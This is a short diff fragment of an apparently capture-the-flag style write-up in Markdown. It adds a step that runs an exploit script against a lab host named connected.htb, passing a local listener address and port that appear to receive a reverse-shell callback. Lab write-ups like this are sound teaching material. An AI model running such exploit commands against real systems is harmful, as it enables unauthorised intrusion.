@@ -635,7 +635,9 @@ After:
     def __init__(self, rhost, rport, ssl=True, timeout=90):
 ```
 
+Now run the script against the target.
 
+**Command:** `python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444`
 <div align="center">
 <br>
 <br>
